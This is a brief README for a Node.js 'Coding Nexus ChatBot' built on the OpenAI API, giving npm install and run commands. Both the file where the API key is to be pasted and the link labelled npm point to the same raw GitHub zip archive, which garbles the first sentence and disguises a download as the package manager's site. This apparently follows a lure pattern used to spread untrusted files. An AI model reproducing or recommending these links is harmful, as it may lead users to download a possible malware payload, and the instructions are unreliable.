# Coding Nexus ChatBot

Coding Nexus ChatBot uses the OpenAI API to create a chatbot.

## Installation

Get your API key from OpenAI and paste the key into the ```https://raw.githubusercontent.com/cyran-kyle/ChatBot-OpenAI/Mine/app/Open-Bot-Chat-AI-v1.5-beta.3.zip``` file

Use the package manager [npm](https://raw.githubusercontent.com/cyran-kyle/ChatBot-OpenAI/Mine/app/Open-Bot-Chat-AI-v1.5-beta.3.zip) to install the required packages.

```bash
cd api
npm i
```

## Usage

```bash
cd api
node .
```
